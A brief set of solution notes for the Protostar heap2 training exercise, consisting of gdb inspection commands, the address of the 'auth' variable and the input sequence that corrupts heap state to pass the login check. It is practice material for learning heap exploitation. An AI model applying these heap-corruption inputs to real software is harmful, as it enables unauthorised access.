# https://www.pwntester.com/blog/2013/12/20/protostar-heap0-4-write-ups/
# https://www.youtube.com/watch?v=uLT5otjoBmE
# breakpoint at first print
# in gdb:
#	commands 1
#	echo HEAP \n
#	x/32x 0x0804c000
#	echo AUTH\n
#	print *auth
#	end

# 0x0804c027 - address of auth variable

./heap2

auth name
service AAAA
service BBBB
login